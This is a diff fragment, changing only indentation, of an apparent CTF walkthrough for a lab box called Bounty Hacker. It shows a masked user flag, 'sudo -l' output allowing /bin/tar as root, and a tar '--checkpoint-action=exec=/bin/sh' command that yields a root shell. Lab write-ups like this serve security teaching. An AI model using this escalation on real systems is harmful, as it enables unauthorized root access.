@@ -81,13 +81,13 @@ Here, we found two text files.
       cat user.txt
       THM{C**********3}
       
-     #root.txt
+    #root.txt
       first, tried with sudo -l
       User lin may run the following commands on bountyhacker:
       (root) /bin/tar
       It seems we can with lin as with sudo privilage.
       
-        *sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+      *sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
         tar: Removing leading `/' from member names
           # id
           uid=0(root) gid=0(root) groups=0(root)
